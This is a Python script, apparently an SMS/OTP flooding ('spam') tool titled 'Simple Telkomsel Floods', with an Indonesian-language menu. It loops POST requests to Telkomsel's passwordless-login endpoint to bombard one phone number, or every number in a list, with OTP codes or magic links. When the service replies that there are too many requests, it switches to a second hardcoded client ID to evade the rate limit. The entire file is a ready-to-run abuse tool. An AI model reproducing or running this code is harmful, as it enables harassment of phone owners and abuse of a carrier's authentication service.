from requests import session as q
from sys import stdout, exit
from time import sleep

delay = 3
def myPhone(m):
	pars = m.replace("-", "")
	m = pars.replace("+", "")
	m = m.replace(" ", "")
	if(m.startswith("62")):
		return m
	if(m.startswith("0")):
		m = "62"+m[1::]
	return m
ask = lambda t: input(t)
def warning(kondisi, pesan):
	CRED = '\033[91m'
	CEND = '\033[0m'
	GREN = "\033[92m"
	if(kondisi):
		pesan =GREN + pesan + CEND
	else:
		pesan = CRED + pesan + CEND
	stdout.writelines(pesan+"\r\n")
def openfiles(o):
	list_target = []
	with open(o) as list_nomor:
		for parse in list_nomor.readlines():
			list_target.append(myPhone(parse.replace("\n", "")))
	return list_target
def otpRequest(n):
	dataa = {
	"client_id": "9yUwRUZirC0DXZyjMeQF4zCr6KO2R0Ub",
	"phone_number":"+"+n,"connection":"sms"}
	resp = q().post("https://tdwidm.telkomsel.com/passwordless/start", data=dataa)
	if(resp.text.startswith("Too")):
		dataa.update({"client_id":"TFKYtPumTXcLM8xEZATlvceX2Vtblaw3"})
		resp = q().post("https://tdwidm.telkomsel.com/passwordless/start", data=dataa)
		warning(False, "Magic Link: "+n) if(resp.text.startswith("Too")) else warning(True, "Magic Link: "+n)
	else:
		warning(True, "Otp Code: "+n)
def floods(start, s, file):
	for jumlah in range(start):
		for gaskeun in openfiles(file):
			otpRequest(gaskeun)
			sleep(s)
def single(n, ranges, times):
	for i in range(ranges):
		otpRequest(n)
		sleep(times)
def menus():
	warning(False, "Simple Telkomsel Floods by [QiubyZhukhi]")
	warning(True, "FaceBook: https://d.facebook.com/qiuby.zhukhi\n")
	p = {
				1:"[1]. Satu kontak",
				2:"[2]. Berdasarkan Listmu",
				3:"[3]. Exit"
			}
	[warning(True, v) for k,v in p.items()]
	x = int(ask("[?] Masukkan pilihan: "));asm = p.get(x, False)
	if asm != False:
		warning(True, "> {}\n".format(asm))
		return x
	warning(False, "[!] Menu Tidak ada Sob [!]")

def main():
	while(1):
		x = menus()
		if(x==1):
			single(myPhone(ask("[Phone auto parser](08, +62, 62)> ")), int(ask("[number](Jumlah spam)> ")), delay)
		elif(x==2):
			floods(int(ask("[number](Jumlah spam): ")), delay, ask("[Fullpath](File *.txt): "))
		elif(x==3):
			exit(1)
		else:
			exit(1)
		continue
if __name__ == "__main__":
	main()
	
	
		
